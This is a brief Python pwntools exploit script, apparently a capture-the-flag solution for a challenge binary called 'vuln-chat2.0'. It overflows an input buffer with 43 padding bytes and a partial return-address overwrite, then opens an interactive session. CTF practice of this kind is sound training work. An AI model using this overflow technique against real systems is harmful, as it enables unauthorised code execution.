#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln-chat2.0")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    r.sendline("name")
    r.send("A" * 43 + "\x72\x86")

    r.interactive()


if __name__ == "__main__":
    main()
